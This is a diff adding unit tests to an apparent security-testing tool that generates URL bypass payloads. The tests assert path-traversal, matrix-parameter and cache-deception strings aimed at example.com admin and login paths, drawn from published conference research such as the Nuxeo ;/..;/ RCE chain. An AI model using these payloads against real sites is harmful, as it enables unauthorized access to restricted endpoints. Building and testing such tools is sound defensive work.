@@ -209,6 +209,74 @@ class UrlPayloadProcessorTest {
     }
 
     @Test
+    void generator_orangeNuxeoRceChainShapeEmitted() throws Exception {
+        // Orange Tsai BH 2018: /nuxeo/login.jsp;/..;/create_file.xhtml.
+        // Composite matrix+traversal+matrix shape. For target /create_file.xhtml
+        // we want the sacrificial prefix "x;/..;/" to HEAD-insert correctly.
+        UrlPayloadProcessor p = new UrlPayloadProcessor("https://example.com/create_file.xhtml");
+        List<String> out = p.generateUrlPayloads(List.of("[h]x;/..;/"));
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/x;/..;//create_file.xhtml")),
+            "expected /x;/..;/ composite; got " + out);
+    }
+
+    @Test
+    void generator_orangeMultiSegmentMatrixShapeEmitted() throws Exception {
+        // Orange Tsai BH 2018: /login;foo/bar;quz. Sacrificial chain with
+        // matrix params on two placeholder segments before the traversal.
+        UrlPayloadProcessor p = new UrlPayloadProcessor("https://example.com/admin");
+        List<String> out = p.generateUrlPayloads(List.of("[h]x;a=1/y;b=2/.."));
+        assertTrue(out.stream().anyMatch(u -> u.contains("x;a=1/y;b=2/..")),
+            "expected x;a=1/y;b=2/.. multi-matrix HEAD chain; got " + out);
+    }
+
+    @Test
+    void generator_tiurinCacheDeceptionExtensionsEmitted() throws Exception {
+        // Tiurin ZeroNights 2018 / Gil BH 2017 — cache deception via
+        // Varnish/Cloudflare regex bypass. For target /admin, suffix
+        // payloads like /admin?.jpg and /admin/.css must be emitted.
+        UrlPayloadProcessor p = new UrlPayloadProcessor("https://example.com/admin");
+        List<String> out = p.generateUrlPayloads(List.of());
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/admin?.jpg")),
+            "expected /admin?.jpg cache-deception suffix; got " + out.size() + " URLs");
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/admin/.css")),
+            "expected /admin/.css Cloudflare-style suffix");
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/admin;.js")),
+            "expected /admin;.js CF matrix extension suffix");
+    }
+
+    @Test
+    void generator_tiurinHashPrefixBypassEmitted() throws Exception {
+        // Nginx + Weblogic bypass from Tiurin (ZeroNights 2018): /#/../<target>.
+        // Nginx treats # as fragment, but Weblogic parses it as a path byte and
+        // normalizes the traversal.
+        UrlPayloadProcessor p = new UrlPayloadProcessor("https://example.com/Login.jsp");
+        List<String> out = p.generateUrlPayloads(List.of("[h]#/..", "[h]#/../"));
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/#/../Login.jsp")),
+            "expected /#/../Login.jsp (Tiurin Nginx+Weblogic bypass); got " + out);
+    }
+
+    @Test
+    void generator_tiurinDoubleSlashDotSegmentCombosEmitted() throws Exception {
+        // Tiurin Apache-rewrite bypass family: /x/..//target, /x//./../target,
+        // /x/.//../target. All must fire as HEAD-insertions. The join adds a
+        // '/' between the payload and the first segment, so a trailing slash
+        // in the payload becomes '//' before the target — both shapes are
+        // meaningful against different parsers.
+        UrlPayloadProcessor p = new UrlPayloadProcessor("https://example.com/admin");
+        List<String> out = p.generateUrlPayloads(List.of(
+            "[h]x//..", "[h]x//./..", "[h]x/.//..", "[h]x/.//../"
+        ));
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/x//../admin")),
+            "expected /x//../admin from [h]x//..");
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/x//./../admin")),
+            "expected /x//./../admin from [h]x//./..");
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/x/.//../admin")),
+            "expected /x/.//../admin from [h]x/.//..");
+        assertTrue(out.stream().anyMatch(u -> u.endsWith("/x/.//..//admin")),
+            "expected /x/.//..//admin from [h]x/.//../");
+    }
+
+    @Test
     void generator_sacrificialPrefixLandsOnTargetShape() throws Exception {
         UrlPayloadProcessor processor = new UrlPayloadProcessor("https://example.com/admin");
         List<String> out = processor.generateUrlPayloads(List.of("[h]x/.."));
